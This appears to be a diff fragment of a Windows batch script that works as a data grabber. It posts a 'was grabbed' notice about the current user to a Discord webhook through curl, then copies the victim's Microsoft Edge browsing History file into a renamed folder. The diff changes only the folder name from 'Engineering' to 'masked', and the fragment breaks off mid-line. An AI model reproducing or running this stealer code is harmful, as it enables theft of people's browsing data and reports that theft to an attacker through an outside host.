@@ -14,11 +14,11 @@ set "message_text=**:crown: %username% was grabbed :crown:** \n\n :person_poutin
 curl -k -F "payload_json={\"content\": \"%message_text%\"}" https://discord.com/api/webhooks/[YOUR WEBHOOK]
 
 :: create file
-mkdir die
+mkdir masked
 
 :: copy files
-xcopy "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default\History" "C:\Users\%username%\OneDrive\Bureau\Engineering"
-cd "C:\Users\%username%\OneDrive\Bureau\Engineering"
+xcopy "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default\History" "C:\Users\%username%\OneDrive\Bureau\masked"
+cd "C:\Users\%username%\OneDrive\Bureau\masked"
 rename "History" "Historique.txt"
 r
 
